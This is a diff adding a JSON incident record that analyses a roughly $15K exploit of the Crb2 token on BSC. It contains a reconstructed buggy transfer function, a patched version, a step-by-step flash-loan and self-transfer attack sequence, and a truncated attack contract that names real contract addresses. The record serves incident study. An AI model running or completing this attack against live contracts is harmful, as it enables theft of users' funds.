@@ -1,0 +1,36 @@
+{
+ "id": "2024__2024-06-XX_Crb2_BuySellTransferIteration",
+ "source_file": "2024/2024-06-XX_Crb2_BuySellTransferIteration.md",
+ "title": "Crb2 — CRB Balance Manipulation via Repeated Buy/Sell + Direct Transfer Loop Analysis",
+ "date": "2024-06-01",
+ "protocol": "Crb2",
+ "chain": "BSC",
+ "loss_raw": "~$15,000",
+ "loss_usd": 15000.0,
+ "root_cause": "CRB token's tax/reward mechanism triggered an internal balance accumulation bug via repeated buy/sell cycles (70x) and direct transfers to the contract address (250 + 3000 times), enabling profit extraction",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "defl-tax-token"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: balance accumulation bug on repeated transfers\ncontract CRBToken {\n    mapping(address => uint256) private _balances;\n    uint256 public rewardPool;\n\n    function _transfer(address from, address to, uint256 amount) internal {\n        uint256 tax = amount * taxRate / 100;\n        uint256 reward = tax / 2;\n\n        // Reward redistribution when transferring to the contract address\n        if (to == address(this)) {\n            rewardPool += reward;\n            // rewardPool accumulates on repeated calls — no upper bound\n            _balances[from] += rewardPool; // ← Bug: accumulated value re-added on every transfer\n        }\n        _balances[from] -= amount;\n        _balances[to] += amount - tax;\n    }\n}\n\n//",
+  "// File: Crb2_decompiled.sol\ncontract Crb2 {\n    function balanceOf(address p0) external view returns (uint256) {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code\nfunction _transfer(address from, address to, uint256 amount) internal {\n    uint256 tax = amount * taxRate / 100;\n    _balances[from] -= amount;\n    _balances[to] += amount - tax;\n    // Rewards handled via a separate claim function\n    pendingRewards[from] += tax / 2;\n}"
+ ],
+ "steps": [
+  "→ [1] V3 Flash Loan: borrow BUSDT",
+  "→ [2] BUSDT → CRB buy × 70 (buy-sell cycles)",
+  "→ [3] CRB.transfer(address(CRB), amount) × 250",
+  "→ [4] CRB.transfer(address(CRB), amount) × 3000",
+  "→ [5] Manipulated CRB → BUSDT reverse swap",
+  "→ [6] V3 Flash Loan repayment",
+  "→ [7] ~$15K profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] V3 Flash Loan: borrow BUSDT\n  │         └─ 0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4\n  │\n  ├─→ [2] BUSDT → CRB buy × 70 (buy-sell cycles)\n  │         └─ Tax/reward state manipulated each cycle\n  │\n  ├─→ [3] CRB.transfer(address(CRB), amount) × 250\n  │         └─ Direct transfer to contract — rewardPool accumulates\n  │         └─ _balances re-addition bug triggered\n  │\n  ├─→ [4] CRB.transfer(address(CRB), amount) × 3000\n  │         └─ Further balance accumulation\n  │         └─ CRB balance recorded far above actual holdings\n  │\n  ├─→ [5] Manipulated CRB → BUSDT reverse swap\n  │\n  ├─→ [6] V3 Flash Loan repayment\n  │\n  └─→ [7] ~$15K profit",
+  "interface ICRB {\n    function transfer(address to, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n\ninterface IUniswapV3Pool {\n    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;\n}\n\ncontract AttackContract {\n    ICRB constant CRB = ICRB(0xee6De822159765daf0Fd72d71529d7ab026ec2f2);\n    IUniswapV3Pool constant flashPool = IUniswapV3Pool(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);\n    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n\n    function testExploit() external {\n        // [1] Execute V3 flash loan\n        flashPool.flash(address(this), flashAmount, 0, \"\");\n    }\n\n    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata) e"
+ ]
+}
